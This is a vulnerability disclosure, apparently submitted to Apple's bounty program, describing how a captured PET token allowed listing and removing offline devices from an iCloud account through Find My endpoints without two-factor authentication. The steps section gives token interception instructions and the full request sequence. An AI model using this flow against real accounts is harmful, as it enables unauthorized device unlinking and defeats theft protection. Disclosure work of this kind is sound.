# fmipmobile.icloud.com: improper token scoping allows unauthorized iCloud device removal via PET
**Apple Security Bounty ID:** OE1102082402813  
**Initial Report:** 2025-05-02 21:39 (EST)

---

## Disclosure Timeline

- **Reported to Apple:** May 02, 2025 
- **Apple Report ID:** OE1102082402813  
- **Patched:** July 13, 2025 
- **CVE ID:** CVE-2025-68640

---
## Summary

A vulnerability in Apple's Find My iPhone (FMiP) backend (`fmipmobile.icloud.com`) allows an attacker with a valid Apple ID and its associated PET (Private Endpoint Token) to enumerate and remove devices from the account **without triggering two-factor authentication (2FA)** or validating device ownership.

This could allow unauthorized removal of iCloud-locked devices, potentially defeating Activation Lock protection for offline devices.

---

## Impact

An attacker in possession of a PET token (e.g., from proxying a session or capturing a device token) can:

- Enumerate all devices on an iCloud account via `/initClient`
- Generate per-device scoped tokens via `/authForUserDevice`
- Submit a device removal request via `/remove`
- Receive a `200 OK` status and unlink the device silently (if offline)

This bypasses iCloud web authentication and trusted device verification workflows, posing a risk to user device security.

---

## Affected Endpoints

- `https://fmipmobile.icloud.com/fmipservice/device/initClient`
- `https://fmipmobile.icloud.com/fmipservice/device/authForUserDevice`
- `https://fmipmobile.icloud.com/fmipservice/device/remove`

---

## What is Needed to Reproduce

- A valid Apple ID and password (controlled test account)
- A valid PET token (captured from an iOS session or extracted using a proxy)
- At least one device registered under the account in **offline state**

> Note: This PoC was conducted using a test account and simulated devices.

---

## Steps to Reproduce

1. **Capture PET token** from a legitimate iOS session:
   - Intercept HTTPS requests from the Find My app
   - Extract PET from Basic Authorization header: `Authorization: Basic base64(AppleID:PET)`

2. **List devices**

   ```
   POST https://fmipmobile.icloud.com/fmipservice/device/initClient
   Authorization: Basic base64(appleid:PET)
   Content-Type: application/json
   ```

   - Response: JSON with `content[]` (device list) and `serverContext`

3. **Authorize a device**

   ```
   POST https://fmipmobile.icloud.com/fmipservice/device/authForUserDevice
   Content-Type: application/json

   {
     "authToken": "PET",
     "device": "<DEVICE_ID>"
   }
   ```

   - Response:

   ```json
   {
     "authToken": "<DEVICE_SCOPED_TOKEN>"
   }
   ```

4. **Remove the device**

   ```
   POST https://fmipmobile.icloud.com/fmipservice/device/remove
   Authorization: Basic base64(appleid:PET)
   Content-Type: application/json

   {
     "device": "<DEVICE_ID>",
     "authToken": "<DEVICE_SCOPED_TOKEN>",
     "serverContext": { ... },
     "clientContext": { "appVersion": "7.0" }
   }
   ```

5. **Expected result**: `statusCode: 200` if the device is offline, indicating successful removal.

---

## Expected Behavior

- PET token should not be sufficient to remove devices.
- Removal actions should trigger 2FA or trusted device re-authentication.
- API endpoints should verify ownership and recent session activity.

---

## Actual Behavior

- PET token allows unrestricted access to device enumeration and removal endpoints.
- Offline devices can be silently removed with no user prompt or confirmation.
- 2FA is not triggered for any step in this flow.

---

## Proof of Concept

A proof-of-concept (not included publicly) demonstrates the full flow and includes:

- `poc_device_remove.py` – Python script demonstrating the full flow

---

## Recommendations

- Enforce multi-factor authentication before allowing device removal operations.
- Scope PETs strictly to session context and short expiration windows.
- Introduce server-side checks to prevent sensitive operations on expired or offline sessions.

---

## Disclosure Policy

This issue was reported to Apple in accordance with the Apple Security Bounty program.

Apple Security Bounty ID: OE1102082402813

## References

- https://support.apple.com/security
- https://developer.apple.com/security-bounty/

## Author

Arber Kadriu

## License

This material is shared for educational and transparency purposes to promote responsible security research and awareness.

